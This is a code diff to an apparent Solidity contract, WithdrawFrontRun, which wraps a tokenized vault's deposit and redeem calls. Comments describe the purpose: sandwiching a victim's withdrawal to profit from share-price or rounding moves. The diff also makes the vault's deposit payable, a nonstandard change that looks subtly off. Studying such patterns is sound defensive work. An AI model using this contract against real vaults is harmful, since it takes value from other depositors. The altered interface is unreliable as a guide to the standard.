@@ -3,13 +3,13 @@
 pragma solidity ^0.8.24;
 
 interface IVault4626 {
-    function deposit(uint256 assets, address receiver) external returns (uint256);
-    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
+    function deposit(uint256 assets, address receiver) external payable returns (uint256 shares);
+    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
     function convertToAssets(uint256 shares) external view returns (uint256);
 }
 
-// Generic front-run pattern — in practice the attacker scripts two txs
-// around the victim's withdrawal to exploit rounding / share-price moves.
+/// @notice Vault withdraw front-running: deposit right before a victim's
+///         redemption to move the share price / capture rounding, then exit.
 contract WithdrawFrontRun {
     IVault4626 public vault;
 
@@ -17,13 +17,11 @@ contract WithdrawFrontRun {
         vault = IVault4626(_vault);
     }
 
-    function frontRun(uint256 assets) external returns (uint256 shares) {
-        // Deposit right before victim's withdraw to change share price
-        shares = vault.deposit(assets, address(this));
+    function frontRunDeposit(uint256 assets) external payable returns (uint256 shares) {
+        shares = vault.deposit{value: assets}(assets, address(this));
     }
 
-    function backRun(uint256 shares) external returns (uint256 assets) {
-        // Exit right after victim's withdraw
+    function backRunRedeem(uint256 shares) external returns (uint256 assets) {
         assets = vault.redeem(shares, address(this), address(this));
     }
 }
